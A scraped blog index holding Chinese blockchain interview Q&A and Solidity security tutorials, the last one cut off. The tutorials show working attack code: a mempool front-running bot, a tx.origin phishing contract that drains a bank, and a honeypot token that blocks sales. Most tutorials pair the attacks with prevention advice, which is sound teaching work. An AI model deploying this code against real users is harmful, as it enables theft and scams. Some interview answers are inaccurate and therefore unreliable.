答：存储（Storage）、内存（Memory）和Calldata。 Storage： 可以把存储想象成一个数据库。每个智能合约都管理自己的存储变量，从而得到一个键值对数据库（256位的键和值）。存储与普通数据库的唯一区别就是，由于存在燃料费用的问题它读取和写入操作的成本更高。 Memory： 内存是一个临时性的存储。当函数调用执行完毕后，内存中的数据将会被释放。你可以在内存中分配各种复杂的数据类型，如数组和结构体。 Calldata： Calldata可以理解为一个函数调用堆栈（Callstack）。它是临时的，不可修改的，它存储着以太坊虚拟机的执行数据。 存储区和内存区分别存储了哪些变量？ 答：状态变量和局部变量（通常局部变量都是对状态变量的引用）位于存储区中，而函数的参数位于内存区中。 EVM调用和非EVM调用之间有什么区别呢？ 答：EVM调用是智能合约中的函数调用，它触发函数执行并需要燃料。 非EVM调用读取公开可见的数据，不需要燃料。 你需要什么工具与DApp的智能合约进行交互？ 答：需要智能合约的ABI和字节码。 ABI的作用是什么？ 答：ABI是智能合约公共接口的描述，DApp用这个公共接口来调用智能合约。每个节点上的以太坊虚拟机都需要智能合约的字节码来运行智能合约。 为什么要使用大数运算程序库（BigNumber library） 答：因为Javascript无法正确处理大数字。 为什么要始终检查DApp代码的开头是否设置了web3提供程序（provider）？ 答：因为如果不这样，Metamask会用自己的web3提供程序覆盖掉它。 为什么使用web3 js的1.x版本而不是0.2x.x版本？ 答：主要是因为1.x版本的异步调用使用promise对象（承诺将来会执行，比回调对象更合理和更强大）而不是回调对象，promise对象也是javascript中的首选。 “.call”和“.send”有什么区别？ 答：“.send”发起交易并且产生费用，而“.call”仅查询智能合约的状态不产生费用。 是否可以通过这样的命令“.send（{value：1}）”发送一个以太币？ 答：不可以，实际上这样你只送了1wei（1以太币 =10^18Wei）。交易中的单位是wei，而不是以太币。 那是否意味着，为了发送一个以太币，我需要将值设置为10^18？ 答：不用，这样太麻烦。你可以使用util方法，即：web3.utils.toWei（1，’ether’） 。 那是否意味着，为了发送一个以太币，我需要将值设置为10^18？ 答：不用，这样太麻烦。你可以使用util方法，即：web3.utils.toWei（1，’ether’） 。 ","date":"2022-12-20","objectID":"/posts/blockchain-technology-interview-question-and-answer.html:4:0","tags":["基础知识","面试题"],"title":"区块链技术面试题","uri":"/posts/blockchain-technology-interview-question-and-answer.html"},{"categories":["合约安全"],"content":" 引言 智能合约的操纵区块时间攻击，并使用 Foundry 复现。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。 ","date":"2022-12-09","objectID":"/posts/solidity-smart-contract-security-timestamp-manipulation.html:0:0","tags":["solidity","security","timestamp"],"title":"合约安全：操纵区块时间","uri":"/posts/solidity-smart-contract-security-timestamp-manipulation.html"},{"categories":["合约安全"],"content":"1 区块时间 区块时间（block timestamp）是包含在以太坊区块头中的一个 uint64 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。 在 Solidity 中，开发者可以通过全局变量 block.timestamp 获取当前区块的时间戳，类型为 uint256。 ","date":"2022-12-09","objectID":"/posts/solidity-smart-contract-security-timestamp-manipulation.html:1:0","tags":["solidity","security","timestamp"],"title":"合约安全：操纵区块时间","uri":"/posts/solidity-smart-contract-security-timestamp-manipulation.html"},{"categories":["合约安全"],"content":"2 漏洞例子 此例子由坏随机数中的合约改写而成。我们改变了 mint() 铸造函数的条件：当区块时间能被 170 整除时才能成功铸造： contract TimeMnipulation is ERC721 { uint256 totalSupply; // 构造函数，初始化NFT合集的名称、代号 constructor() ERC721(\"\", \"\"){} // 铸造函数：当区块时间能被7整除时才能mint成功 function luckyMint() external returns(bool success){ if(block.timestamp % 170 == 0){ _mint(msg.sender, totalSupply); // mint totalSupply++; success = true; }else{ success = false; } } } ","date":"2022-12-09","objectID":"/posts/solidity-smart-contract-security-timestamp-manipulation.html:2:0","tags":["solidity","security","timestamp"],"title":"合约安全：操纵区块时间","uri":"/posts/solidity-smart-contract-security-timestamp-manipulation.html"},{"categories":["合约安全"],"content":"Foundry复现攻击 攻击者只需操纵区块时间，将它设为能被 170 整除的数字，就可以成功铸造 NFT。我们选择 Foundry 来复现这个攻击，因为它提供了修改区块时间的作弊码（cheatcodes）。如果你不了解 Foundry/作弊码，可以阅读 Foundry Book。 代码大致逻辑 创建一个 TimeManipulation 合约变量 nft。 创建一个钱包地址 alice。 使用作弊码 vm.warp() 将区块时间改为 169，由于不能被170整除，铸造失败。 使用作弊码 vm.warp() 将区块时间改为 17000，由于可以被170整除，铸造成功。 代码： // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.4; import \"forge-std/Test.sol\"; import \"forge-std/console.sol\"; import \"../src/TimeManipulation.sol\"; contract TimeManipulationTest is Test { TimeManipulation public nft; // Computes address for a given private key address alice = vm.addr(1); function setUp() public { nft = new TimeManipulation(); } // forge test -vv --match-test testMint function testMint() public { console.log(\"Condition 1: block.timestamp % 170 != 0\"); // Set block.timestamp to 169 vm.warp(169); console.log(\"block.timestamp: %s\", block.timestamp); // Sets all subsequent calls' msg.sender to be the input address // until `stopPrank` is called vm.startPrank(alice); console.log(\"alice balance before mint: %s\", nft.balanceOf(alice)); nft.luckyMint(); console.log(\"alice balance after mint: %s\", nft.balanceOf(alice)); // Set block.timestamp to 17000 console.log(\"Condition 2: block.timestamp % 170 == 0\"); vm.warp(17000); console.log(\"block.timestamp: %s\", block.timestamp); console.log(\"alice balance before mint: %s\", nft.balanceOf(alice)); nft.luckyMint(); console.log(\"alice balance after mint: %s\", nft.balanceOf(alice)); vm.stopPrank(); } } 在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库： forge init TimeMnipulation cd TimeMnipulation forge install Openzeppelin/openzeppelin-contracts 将这一讲的代码分别复制到src和test目录下，然后使用下列命令启动测试用例： forge test -vv --match-test testMint 输出如下： Running 1 test for test/TimeManipulation.t.sol:TimeManipulationTest [PASS] testMint() (gas: 94666) Logs: Condition 1: block.timestamp % 170 != 0 block.timestamp: 169 alice balance before mint: 0 alice balance after mint: 0 Condition 2: block.timestamp % 170 == 0 block.timestamp: 17000 alice balance before mint: 0 alice balance after mint: 1 Test result: ok. 1 passed; 0 failed; finished in 7.64ms 我们可以看到，当我们将 block.timestamp 修改为 17000时，铸造成功。 ","date":"2022-12-09","objectID":"/posts/solidity-smart-contract-security-timestamp-manipulation.html:3:0","tags":["solidity","security","timestamp"],"title":"合约安全：操纵区块时间","uri":"/posts/solidity-smart-contract-security-timestamp-manipulation.html"},{"categories":["合约安全"],"content":"总结 介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。 ","date":"2022-12-09","objectID":"/posts/solidity-smart-contract-security-timestamp-manipulation.html:4:0","tags":["solidity","security","timestamp"],"title":"合约安全：操纵区块时间","uri":"/posts/solidity-smart-contract-security-timestamp-manipulation.html"},{"categories":["合约安全"],"content":" 引言 智能合约的未检查低级调用（low-level call）的漏洞。失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:0:0","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"1 低级调用 以太坊的低级调用包括 call()，delegatecall()，staticcall()，和send()。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 false ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。 最容易出错的是send()：一些合约使用 send() 发送 ETH，但是 send() 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 send() 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 King of Ether 的链游，因为这个漏洞导致退款无法正常发送（验尸报告）。 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:1:0","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"2 漏洞例子 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:2:0","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"2.1 银行合约 这个合约是在S01 重入攻击教程中的银行合约基础上修改而成。它包含1个状态变量balanceOf记录所有用户的以太坊余额；并且包含3个函数： deposit()：存款函数，将ETH存入银行合约，并更新用户的余额。 withdraw()：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，更新余额，转账。注意：这个函数没有检查 send() 的返回值，提款失败但余额会清零！ getBalance()：获取银行合约里的ETH余额。 contract UncheckedBank { mapping (address =\u003e uint256) public balanceOf; // 余额mapping // 存入ether，并更新余额 function deposit() external payable { balanceOf[msg.sender] += msg.value; } // 提取msg.sender的全部ether function withdraw() external { // 获取余额 uint256 balance = balanceOf[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); balanceOf[msg.sender] = 0; // Unchecked low-level call bool success = payable(msg.sender).send(balance); } // 获取银行合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:2:1","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"2.2 攻击合约 我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 receive() 中的 revert() 将回滚交易，因此它无法接收 ETH；但是提款函数 withdraw() 却能正常调用，清空余额。 contract Attack { UncheckedBank public bank; // Bank合约地址 // 初始化Bank合约地址 constructor(UncheckedBank _bank) { bank = _bank; } // 回调函数，转账ETH时会失败 receive() external payable { revert(); } // 存款函数，调用时 msg.value 设为存款数量 function deposit() external payable { bank.deposit{value: msg.value}(); } // 取款函数，虽然调用成功，但实际上取款失败 function withdraw() external payable { bank.withdraw(); } // 获取本合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:2:2","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"2.3 Remix复现 部署 UncheckedBank 合约。 部署 Attack 合约，构造函数填入 UncheckedBank 合约地址。 调用 Attack 合约的 deposit() 存款函数，存入1 ETH。 调用 Attack 合约的 withdraw() 提款函数，进行提款，调用成功。 分别调用 UncheckedBank 合约的 balanceOf() 函数和 Attack 合约的 getBalance() 函数。尽管上一步调用成功并且储户余额被清空，但是提款失败了。 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:2:3","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"3 预防办法 你可以使用以下几种方法来预防未检查低级调用的漏洞： 检查低级调用的返回值，在上面的银行合约中，我们可以改正 withdraw()。 bool success = payable(msg.sender).send(balance); require(success, \"Failed Sending ETH!\") 合约转账ETH时，使用 call()，并做好重入保护。 使用OpenZeppelin的Address库，它将检查返回值的低级调用封装好了。 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:3:0","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":"4 总结 以太坊的低级调用（call, delegatecall, staticcall, send）在失败时会返回一个布尔值 false，但不会让整个交易回滚。如果开发者没有对它进行检查的话，则会发生意外。 ","date":"2022-12-02","objectID":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html:4:0","tags":["solidity","security"],"title":"合约安全：未检查的低级调用","uri":"/posts/solidity-smart-contract-security-low-level-calls-that-are-not-checked.html"},{"categories":["合约安全"],"content":" 引言 智能合约的抢先交易（Front-running，抢跑）。据统计，以太坊上的套利者通过三明治攻击（sandwich attack）共获利$12亿。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:0:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"1 传统抢跑 抢跑最初诞生于传统金融市场，是一场单纯为了利益的竞赛。在金融市场中，信息差催生了金融中介机构，他们可以通过最先了解某些行业信息并最先做出反应从而实现获利。这些攻击主要发生在股票市场交易和早期的域名注册。 2021 年 9 月，NFT 市场 OpenSea 的产品负责人 Nate Chastain，被发现通过抢先购买将在 OpenSea 首页展示的 NFT 获利。 他利用内幕信息来获得不公平的信息差，OpenSea 将要在首页推送哪些 NFT，然后在展出在首页前抢先买入，然后再在 NFT 登上首页后卖出。然而，有一个人通过将 NFT 交易时间戳与 OpenSea 上有问题的 NFT 的首页促销进行匹配，发现了这一非法行为，Nate 也被告上法院。 另一个传统抢跑的例子包括是在代币上币安/coinbase等知名交易所之前，会有得知内幕消息的老鼠仓提前买入。在上币的公告发出后，币价会大幅上涨，这时抢跑者会卖出盈利。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:1:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"2 链上抢跑 链上抢跑指的是搜索者或矿工通过调高gas或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而MEV是衡量这种利润的指标。 在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些MEV机器人也会搜索mempool中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的swap交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:2:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"3 抢跑实践 如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具： Foundry的anvil工具搭建本地测试链，请提前安装好 foundry。 remix进行NFT合约的部署和铸造 etherjs脚本监听mempool并进行抢跑。 1. 启动Foundry本地测试链： 在安装好 foundry 之后，在命令行输入 anvil --chain-id 1234 -b 10 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。 2. 将Remix连接到测试链： 打开 Remix 的部署页面，打开左上角的Environment下拉菜单，选Foundry Provider即可将 Remix 连接到测试链。 3. 部署NFT合约： 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个mint()，用于免费铸造NFT。 // SPDX-License-Identifier: MIT // By 0xAA pragma solidity ^0.8.4; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\"; // 我们尝试frontrun一笔Free mint交易 contract FreeMint is ERC721 { uint256 public totalSupply; // 构造函数，初始化NFT合集的名称、代号 constructor() ERC721(\"Free Mint NFT\", \"FreeMint\"){} // 铸造函数 function mint() external { _mint(msg.sender, totalSupply); // mint totalSupply++; } } 4. 部署ethers.js抢跑脚本： 简单来说，frontrun.js脚本监听了测试链mempool中的未决交易，筛选出调用了mint()的交易，然后复制它并调高gas进行抢跑。如果你不熟悉ether.js，可以阅读WTF Ethers极简教程。 // provider.on(\"pending\", listener) import { ethers, utils } from \"ethers\"; // 1. 创建provider var url = \"http://127.0.0.1:8545\"; const provider = new ethers.providers.WebSocketProvider(url); let network = provider.getNetwork() network.then(res =\u003e console.log(`[${(new Date).toLocaleTimeString()}] 连接到 chain ID ${res.chainId}`)); // 2. 创建interface对象，用于解码交易详情。 const iface = new utils.Interface([ \"function mint() external\", ]) // 3. 创建钱包，用于发送抢跑交易 const privateKey = '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a' const wallet = new ethers.Wallet(privateKey, provider) const main = async () =\u003e { // 4. 监听pending的mint交易，获取交易详情，然后解码。 console.log(\"\\n4. 监听pending交易，获取txHash，并输出交易详情。\") provider.on(\"pending\", async (txHash) =\u003e { if (txHash) { // 获取tx详情 let tx = await provider.getTransaction(txHash); if (tx) { // filter pendingTx.data if (tx.data.indexOf(iface.getSighash(\"mint\")) !== -1 \u0026\u0026 tx.from != wallet.address ) { // 打印txHash console.log(`\\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \\r`); // 打印解码的交易详情 let parsedTx = iface.parseTransaction(tx) console.log(\"pending交易详情解码：\") console.log(parsedTx); // Input data解码 console.log(\"raw transaction\") console.log(tx); // 构建抢跑tx const txFrontrun = { to: tx.to, value: tx.value, maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 1.2, maxFeePerGas: tx.maxFeePerGas * 1.2, gasLimit: tx.gasLimit * 2, data: tx.data } // 发送抢跑交易 var txResponse = await wallet.sendTransaction(txFrontrun) console.log(`正在frontrun交易`) await txResponse.wait() console.log(`frontrun 交易成功`) } } } }); provider._websocket.on(\"error\", async () =\u003e { console.log(`Unable to connect to ${ep.subdomain} retrying in 3s...`); setTimeout(init, 3000); }); provider._websocket.on(\"close\", async (code) =\u003e { console.log( `Connection lost with code ${code}! Attempting reconnect in 3s...` ); provider._websocket.terminate(); setTimeout(init, 3000); }); }; main() 5. 调用mint()函数： 在 Remix 的部署页面调用 Freemint 合约的mint() 函数，进行 NFT 铸造。 6. 脚本监听到交易并进行抢跑 我们可以在终端看到 frontrun.js 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 ownerOf() 函数查看 tokenId 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:3:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"4 预防方法 抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益： 使用预提交方案(commit-reveal scheme)。 使用暗池，用户发出的交易将不进入公开的mempool，而是直接到矿工手里。例如 flashbots 和 TaiChi。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:4:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"5 总结 这种起源于传统金融行业的攻击模式在区块链中更容易实施，因为所有的交易信息都是公开的。我们做了一个抢跑的时间：抢跑一笔铸造 NFT 的交易。当需要有类似的交易时，最好支持隐藏的内存池，或者实施批量拍卖等措施限制。它是以太坊等公链上普遍存在的问题，我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益。 ","date":"2022-11-22","objectID":"/posts/solidity-smart-contract-security-front-running.html:5:0","tags":["solidity","security","erc721"],"title":"合约安全：抢先交易","uri":"/posts/solidity-smart-contract-security-front-running.html"},{"categories":["合约安全"],"content":"1 tx.origin 钓鱼攻击 笔者上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来笔者使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与tx.origin钓鱼攻击有着异曲同工之妙。 在solidity中，使用tx.origin可以获得启动交易的原始地址，它与msg.sender十分相似，下面我们用一个例子来区分它们之间不同的地方。 如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，msg.sender就是B合约，而tx.origin就是用户A。 因此如果一个银行合约使用了tx.origin做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使msg.sender是攻击合约地址，但tx.origin是银行合约拥有者地址，那么转账就有可能成功。 ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:1:0","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"2 漏洞合约例子 ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:2:0","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"2.1 银行合约 我们先看银行合约，它非常简单，包含一个owner状态变量用于记录合约的拥有者，包含一个构造函数和一个public函数： 构造函数: 在创建合约时给owner变量赋值. transfer(): 该函数会获得两个参数_to和_amount，先检查tx.origin == owner，无误后再给_to转账_amount数量的ETH。注意：这个函数有被钓鱼攻击的风险！ contract Bank { address public owner;//记录合约的拥有者 //在创建合约时给 owner 变量赋值 constructor() payable { owner = msg.sender; } function transfer(address payable _to, uint _amount) public { //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！ require(tx.origin == owner, \"Not owner\"); //转账ETH (bool sent, ) = _to.call{value: _amount}(\"\"); require(sent, \"Failed to send Ether\"); } } ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:2:1","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"2.2 攻击合约 然后是攻击合约，它的攻击逻辑非常简单，就是构造出一个attack()函数进行钓鱼，将银行合约拥有者的余额转账给黑客。它有2个状态变量hacker和bank，分别用来记录黑客地址和要攻击的银行合约地址。 它包含2个函数： 构造函数:初始化bank合约地址. attack()：攻击函数，该函数需要银行合约的owner地址调用，owner调用攻击合约，攻击合约再调用银行合约的transfer()函数，确认tx.origin == owner后，将银行合约内的余额全部转移到黑客地址中。 contract Attack { // 受益者地址 address payable public hacker; // Bank合约地址 Bank bank; constructor(Bank _bank) { //强制将address类型的_bank转换为Bank类型 bank = Bank(_bank); //将受益者地址赋值为部署者地址 hacker = payable(msg.sender); } function attack() public { //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中 bank.transfer(hacker, address(bank).balance); } } ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:2:2","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"2.3 Remix复现 1. 先将value设置为10ETH，再部署 Bank 合约，拥有者地址 owner 被初始化为部署合约地址。 2. 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 Attack 合约，黑客地址 hacker 被初始化为部署合约地址。 3. 切换回owner地址，此时我们被诱导调用了Attack合约的attack()函数，可以看到Bank合约余额被掏空了，同时黑客地址多了10ETH. ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:2:3","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"3 预防办法 目前主要有两种办法来预防可能的tx.origin钓鱼攻击。 ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:3:0","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"3.1 使用msg.sender代替tx.origin msg.sender能够获取直接调用当前合约的调用发送者地址，通过对msg.sender的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用 function transfer(address payable _to, uint256 _amount) public { require(msg.sender == owner, \"Not owner\"); (bool sent, ) = _to.call{value: _amount}(\"\"); require(sent, \"Failed to send Ether\"); } ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:3:1","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"3.2 检验tx.origin == msg.sender 如果一定要使用tx.origin，那么可以再检验tx.origin是否等于msg.sender，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。 function transfer(address payable _to, uint _amount) public { require(tx.origin == owner, \"Not owner\"); require(tx.origin == msg.sender, \"can't call by external contract\"); (bool sent, ) = _to.call{value: _amount}(\"\"); require(sent, \"Failed to send Ether\"); } ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:3:2","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":"4 总结 这一讲，我们介绍了智能合约中的tx.origin钓鱼攻击，目前有两种方法可以预防它：一种是使用msg.sender代替tx.origin；另一种是同时检验tx.origin == msg.sender。推荐使用第一种方法预防，因为后者会拒绝所有来自其他合约的调用。 ","date":"2022-11-13","objectID":"/posts/solidity-smart-contract-security-tx-origin.html:4:0","tags":["solidity","security"],"title":"合约安全：如何使用 tx.origin 进行钓鱼攻击","uri":"/posts/solidity-smart-contract-security-tx-origin.html"},{"categories":["合约安全"],"content":" 引言 将介绍貔貅合约和预防方法（英文习惯叫蜜罐代币 honeypot token）。 ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:0:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":"1 貔貅学入门 貔貅是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。 通常一个貔貅盘有如下的生命周期： 恶意项目方部署貔貅代币合约。 宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。 项目方rug pull卷走资金。 学会貔貅合约的原理，才能更好的识别并避免被割，才能做一个顽强的韭菜！ ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:1:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":"2 貔貅合约 这里我们介绍一个极简的ERC20代币貔貅合约Pixiu。在该合约中，只有合约拥有者可以在uniswap出售代币，其他地址不能。 Pixiu 有一个状态变量pair，用于记录uniswap中 Pixiu-ETH LP的币对地址。它主要有三个函数： 构造函数：初始化代币的名称和代号，并根据 uniswap 和 create2 的原理计算LP合约地址。这个地址会在 _beforeTokenTransfer() 函数中用到。 mint()：铸造函数，仅 owner 地址可以调用，用于铸造 Pixiu 代币。 _beforeTokenTransfer()：ERC20代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 to 为 LP 的时候，也就是韭菜卖出的时候，交易会 revert；只有调用者为owner的时候能够成功。这也是貔貅合约的核心。 // 极简貔貅ERC20代币，只能买，不能卖 contract HoneyPot is ERC20, Ownable { address public pair; // 构造函数：初始化代币名称和代号 constructor() ERC20(\"HoneyPot\", \"Pi Xiu\") { address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory address tokenA = address(this); // 貔貅代币地址 address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; // goerli WETH (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序 bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // calculate pair address pair = address(uint160(uint(keccak256(abi.encodePacked( hex'ff', factory, salt, hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' ))))); } /** * 铸造函数，只有合约所有者可以调用 */ function mint(address to, uint amount) public onlyOwner { _mint(to, amount); } /** * @dev See {ERC20-_beforeTokenTransfer}. * 貔貅函数：只有合约拥有者可以卖出 */ function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._beforeTokenTransfer(from, to, amount); // 当转账的目标地址为 LP 时，会revert if(to == pair){ require(from == owner(), \"Can not Transfer\"); } } } ","date":"2022-10-29","objectID":"/posts/solidity-smart-contract-security-honeypot-token.html:2:0","tags":["solidity","security","erc20","swap"],"title":"合约安全：貔貅 Honeypot Scam","uri":"/posts/solidity-smart-contract-security-honeypot-token.html"},{"categories":["合约安全"],"content":"3 Remix复现 我们会在 Goerli 测试网上部署 Pixiu 合约，并在 uniswap 交易所中演示。 部署 Pixiu 合约。 调用 mint() 函数，给自己铸造 100000 枚貔貅币。 进入 uniswap 